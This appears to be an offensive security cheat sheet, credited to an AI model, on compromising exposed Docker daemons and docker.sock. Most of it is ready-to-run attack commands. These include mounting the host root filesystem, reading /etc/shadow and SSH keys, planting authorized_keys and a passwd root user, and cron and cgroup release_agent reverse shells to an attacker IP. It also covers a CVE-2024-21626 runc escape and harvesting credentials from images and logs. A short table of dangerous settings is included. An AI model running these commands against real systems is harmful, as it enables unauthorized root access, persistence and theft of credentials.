# Docker API

#Docker #DockerAPI #containers #privesc #escape #webservices

## What is the Docker API?
Docker exposes a REST API for managing containers, images, volumes, and networks. When bound to a TCP socket without TLS or authentication, it provides unauthenticated remote control of the Docker daemon — equivalent to root on the host. Also commonly found locally as `/var/run/docker.sock`.

- Port: **TCP 2375** — unencrypted, no auth (critical misconfiguration)
- Port: **TCP 2376** — TLS-encrypted (should require client cert)
- Socket: **`/var/run/docker.sock`** — local Unix socket (writable = root)
- API docs: versioned at `/v1.xx/`

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Cloud/docker\|docker]] | The client itself — `-H tcp://host:2375` drives a remote daemon; run/exec/mount for host takeover |
| [[Tools/Scanning/NMAP\|nmap]] | Find 2375/2376, version/banner detection |
| [[Tools/File Transfer/cURL\|cURL]] | Raw REST API (incl. `--unix-socket`) when no docker client is present — the pure-socket escape |

---

## Enumeration

```bash
# Nmap
nmap -p 2375,2376 --script banner -sV <target>

# Check if API accessible (no auth)
curl -s http://<target>:2375/version | python3 -m json.tool
curl -s http://<target>:2375/info | python3 -m json.tool

# Docker client (remote)
docker -H tcp://<target>:2375 version
docker -H tcp://<target>:2375 info

# Check for docker.sock exposure in web apps / containers
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock
ls -la /run/docker.sock
```

---

## Connect / Access

```bash
# Docker client — set remote host
export DOCKER_HOST=tcp://<target>:2375
docker version
docker info
docker ps
docker images

# Or inline
docker -H tcp://<target>:2375 ps
docker -H tcp://<target>:2375 images

# curl — direct API calls
curl -s http://<target>:2375/<endpoint>

# Over TLS (2376) — if you have client certs
docker -H tcp://<target>:2376 --tlsverify \
  --tlscacert ca.pem --tlscert cert.pem --tlskey key.pem ps
```

---

## Key API Endpoints (curl)

```bash
# Version / info
curl -s http://<target>:2375/version
curl -s http://<target>:2375/info

# List containers (running)
curl -s http://<target>:2375/containers/json
# All containers (including stopped)
curl -s "http://<target>:2375/containers/json?all=true"

# Container details
curl -s http://<target>:2375/containers/<container_id>/json

# List images
curl -s http://<target>:2375/images/json

# List volumes
curl -s http://<target>:2375/volumes

# List networks
curl -s http://<target>:2375/networks

# Exec into container — create exec instance
curl -s -X POST http://<target>:2375/containers/<id>/exec \
  -H "Content-Type: application/json" \
  -d '{"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Cmd":["id"]}'

# Inspect image for env vars / credentials
curl -s http://<target>:2375/images/<image_id>/json | python3 -m json.tool | grep -i "env\|pass\|secret\|key"
```

---

## Attack Vectors

### Remote API — Deploy Container with Host Filesystem Mounted

Full host filesystem read/write as root inside container.

```bash
# Pull an image (or use existing)
docker -H tcp://<target>:2375 pull alpine

# Run container with host / mounted
docker -H tcp://<target>:2375 run -it -v /:/mnt/host alpine chroot /mnt/host

# Now you have a root shell on the host filesystem
# Read sensitive files
docker -H tcp://<target>:2375 run --rm -v /:/mnt alpine cat /mnt/etc/shadow
docker -H tcp://<target>:2375 run --rm -v /:/mnt alpine cat /mnt/root/.ssh/id_rsa

# Write SSH key to host root
docker -H tcp://<target>:2375 run --rm -v /:/mnt alpine sh -c \
  "mkdir -p /mnt/root/.ssh && echo 'ssh-rsa AAAA... attacker@kali' >> /mnt/root/.ssh/authorized_keys"
ssh root@<target>

# Add root user to /etc/passwd
docker -H tcp://<target>:2375 run --rm -v /:/mnt alpine sh -c \
  "echo 'hacker:\$1\$hacker\$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /mnt/etc/passwd"

# Write cron reverse shell
docker -H tcp://<target>:2375 run --rm -v /:/mnt alpine sh -c \
  "echo '* * * * * root bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1' >> /mnt/etc/crontab"
```

### Remote API — Exec into Running Container

```bash
# List running containers
docker -H tcp://<target>:2375 ps

# Exec shell into running container
docker -H tcp://<target>:2375 exec -it <container_id> /bin/bash
docker -H tcp://<target>:2375 exec -it <container_id> sh

# Via API (non-interactive)
# Step 1: Create exec
exec_id=$(curl -s -X POST http://<target>:2375/containers/<id>/exec \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/etc/shadow"]}' | python3 -c "import sys,json; print(json.load(sys.stdin)['Id'])")

# Step 2: Start exec
curl -s -X POST http://<target>:2375/exec/$exec_id/start \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":false}'
```

### Remote API — Image Inspection for Credentials

```bash
# Images often contain credentials in ENV vars, labels, or build history
docker -H tcp://<target>:2375 images
docker -H tcp://<target>:2375 inspect <image_id>
docker -H tcp://<target>:2375 history <image_id>

# Via API — check env vars
curl -s http://<target>:2375/images/<image_id>/json | \
  python3 -m json.tool | grep -A 1 -i "env\|pass\|secret\|key\|token"

# Check all images for secrets
for img in $(docker -H tcp://<target>:2375 images -q); do
  echo "=== $img ==="
  docker -H tcp://<target>:2375 inspect $img | grep -i "env\|pass\|secret\|key" 
done
```

### docker.sock — Local Privilege Escalation

If you have access to `/var/run/docker.sock` (e.g., as a low-priv user in the `docker` group, or from inside a container with the socket mounted):

```bash
# Check if socket is accessible
ls -la /var/run/docker.sock
groups   # check if in 'docker' group

# If in docker group — instant root via host mount
docker run -it -v /:/mnt alpine chroot /mnt
# Now in root shell on host

# Via curl to socket (no docker client needed)
curl -s --unix-socket /var/run/docker.sock http://localhost/version
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# Deploy escape container via socket — FULL create → start → read chain
# (needed when you have only the raw socket + curl, no docker client binary)
SOCK=/var/run/docker.sock

# 1. Create a container that mounts host / and writes an attacker SSH key to root
cid=$(curl -s --unix-socket $SOCK -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image":"alpine",
    "Cmd":["/bin/sh","-c","mkdir -p /mnt/root/.ssh && echo ssh-rsa AAAA...attacker >> /mnt/root/.ssh/authorized_keys && cat /mnt/etc/shadow"],
    "HostConfig":{"Binds":["/:/mnt"]}
  }' | python3 -c "import sys,json;print(json.load(sys.stdin)['Id'])")

# 2. Start it
curl -s --unix-socket $SOCK -X POST http://localhost/containers/$cid/start

# 3. Read the command output (host /etc/shadow, proof of root R/W)
curl -s --unix-socket $SOCK "http://localhost/containers/$cid/logs?stdout=true&stderr=true"

# Same chain works remotely against tcp://<target>:2375 — swap `--unix-socket $SOCK`
# for the http://<target>:2375 base URL. No local image pull needed if alpine exists;
# otherwise POST /images/create?fromImage=alpine first.
```

### Privileged Container Escape (Inside Container)

If you're inside a container run with `--privileged`:

```bash
# Check if privileged
cat /proc/1/status | grep CapEff
# Full capabilities = 0000003fffffffff = privileged

# Method 1 — mount host disk
fdisk -l   # find host disk (e.g. /dev/sda1)
mkdir /tmp/host
mount /dev/sda1 /tmp/host
chroot /tmp/host

# Method 2 — cgroup release_agent exploit
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### CVE-2024-21626 — Leaky Vessels (runc WORKDIR escape)

runc ≤ 1.1.11 leaks host-filesystem file descriptors: setting a container's working directory to `/proc/self/fd/<n>` (typically fd 7–9) lands the process **in the host namespace** before the fd is closed. Escape without a mounted socket or `--privileged` — you only need to control the image's `WORKDIR` (malicious image via `docker run`/`docker build`) or the `cwd` on a `docker exec`. Patched in runc 1.1.12.

```dockerfile
# Malicious image variant — WORKDIR points at a leaked host fd
FROM alpine
WORKDIR /proc/self/fd/9
# On run, the container's CWD resolves into the host FS; from there, traverse out:
RUN cd ../../../ && cat etc/shadow > /proc/1/root/tmp/loot 2>/dev/null || true
```

```bash
# Exec variant against an already-running container (no image control needed)
docker -H tcp://<target>:2375 exec --workdir /proc/self/fd/9 <cid> \
  sh -c "cd ../../../ && cat etc/shadow"
# The exact fd number varies (7/8/9) — brute the small range if 9 misses.
```

See [[Techniques/Container Escape|Container Escape]] for the full breakout catalogue.

### Container with Host Network / PID Namespace

```bash
# Run container sharing host network + PID namespace
docker -H tcp://<target>:2375 run --rm -it \
  --pid=host --net=host --privileged alpine nsenter -t 1 -m -u -i -n sh
# Now in host PID 1 namespace = host root shell
```

---

## Post-Exploitation — Gather Info

```bash
# Inspect all running containers for interesting data
docker -H tcp://<target>:2375 inspect $(docker -H tcp://<target>:2375 ps -q)

# Check container environment variables (often contain credentials)
docker -H tcp://<target>:2375 inspect <id> --format '{{json .Config.Env}}'

# Container logs (may contain credentials, tokens)
docker -H tcp://<target>:2375 logs <container_id>
docker -H tcp://<target>:2375 logs <container_id> 2>&1 | grep -i "pass\|token\|secret\|key"

# Volume mounts — find mounted host paths
docker -H tcp://<target>:2375 inspect <id> --format '{{json .Mounts}}'

# Copy files from container
docker -H tcp://<target>:2375 cp <container_id>:/etc/passwd /tmp/passwd
docker -H tcp://<target>:2375 cp <container_id>:/app/config.py /tmp/
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `dockerd -H tcp://0.0.0.0:2375` (no TLS) | Unauthenticated remote root |
| `/var/run/docker.sock` world-writable or mounted in container | Local → root trivially |
| User in `docker` group | Equivalent to passwordless sudo |
| Containers run with `--privileged` | Host escape via disk mount or cgroup |
| `--pid=host` or `--net=host` | Namespace sharing → host access |
| No AppArmor/seccomp profiles | Fewer restrictions on escape |
| Credentials in image ENV vars | Exposed via `docker inspect` |

---

## Quick Reference

| Goal | Command |
|---|---|
| Check remote API | `curl -s http://host:2375/version` |
| List containers | `docker -H tcp://host:2375 ps -a` |
| List images | `docker -H tcp://host:2375 images` |
| Mount host → root | `docker -H tcp://host:2375 run -it -v /:/mnt alpine chroot /mnt` |
| Write SSH key | `docker -H tcp://host:2375 run --rm -v /:/mnt alpine sh -c "echo 'pub_key' >> /mnt/root/.ssh/authorized_keys"` |
| Read shadow | `docker -H tcp://host:2375 run --rm -v /:/mnt alpine cat /mnt/etc/shadow` |
| Exec into container | `docker -H tcp://host:2375 exec -it <id> sh` |
| docker.sock escape | `docker run -it -v /:/mnt alpine chroot /mnt` |
| Pure-socket escape (no client) | `curl --unix-socket /var/run/docker.sock -X POST .../containers/create` → `/start` → `/logs` |
| Leaky Vessels (CVE-2024-21626) | `docker exec --workdir /proc/self/fd/9 <cid> sh -c "cd ../../../ && cat etc/shadow"` |
| Inspect env vars | `docker -H tcp://host:2375 inspect <id> --format '{{json .Config.Env}}'` |
| Container logs | `docker -H tcp://host:2375 logs <id>` |

---

> [!note] **See also** — the counterpart to this *network-exposed daemon* note is [[Techniques/Container Escape|Container Escape]] (breaking out from *inside* a container, incl. a locally-mounted `docker.sock`). Orchestration: [[Services/Cloud & Data/Kubernetes|Kubernetes]]. Defensive view: [[Frameworks and Compliance/Container-Security|Container Security]].

---

*Created: 2026-07-13*
*Updated: 2026-09-24*
*Model: claude-opus-4-8*
